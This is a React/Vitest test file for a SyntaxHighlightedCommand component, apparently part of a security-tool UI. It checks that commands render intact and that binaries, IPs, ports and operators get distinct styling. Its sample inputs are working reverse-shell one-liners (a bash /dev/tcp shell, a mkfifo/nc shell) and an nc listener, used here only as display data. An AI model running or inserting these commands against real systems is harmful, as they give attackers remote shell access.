import { render, screen } from '@testing-library/react';
import { describe, it, expect } from 'vitest';
import { SyntaxHighlightedCommand } from './SyntaxHighlightedCommand';

describe('SyntaxHighlightedCommand component', () => {
  it('renders command text preserving exact text content for copy operations', () => {
    const cmd = 'bash -i >& /dev/tcp/10.10.14.99/9001 0>&1';
    const { container } = render(<SyntaxHighlightedCommand command={cmd} />);
    expect(container.textContent).toBe(cmd);
    expect(screen.getByText(/10\.10\.14\.99/)).toBeInTheDocument();
  });

  it('highlights binaries, IPs, ports, and operators with distinct classes', () => {
    const cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.50 4444 >/tmp/f';
    const { container } = render(<SyntaxHighlightedCommand command={cmd} />);
    expect(container.textContent).toBe(cmd);

    // IP should use the syntax number token with underline
    const ipSpan = screen.getByText('10.10.14.50');
    expect(ipSpan.className).toContain('text-syntax-number');
    expect(ipSpan.className).toContain('underline');

    // Port should use the syntax number token with tabular figures
    const portSpan = screen.getByText('4444');
    expect(portSpan.className).toContain('text-syntax-number');
    expect(portSpan.className).toContain('tabular-nums');

    // Binary and operator tokens use distinct syntax tokens
    expect(screen.getAllByText('nc')[0].className).toContain('text-syntax-keyword');
    expect(screen.getAllByText('|')[0].className).toContain('text-syntax-comment');
    expect(screen.getByText('-i').className).toContain('text-syntax-flag');
  });

  it('renders on the fixed-dark inverse surface', () => {
    const { container } = render(<SyntaxHighlightedCommand command="nc -lvnp 4444" />);
    const root = container.firstElementChild as HTMLElement;
    expect(root.className).toContain('bg-surface-inverse');
    expect(root.className).toContain('text-on-inverse');
  });

  it('handles empty commands safely', () => {
    const { container } = render(<SyntaxHighlightedCommand command="" />);
    expect(container.textContent).toBe('');
  });
});
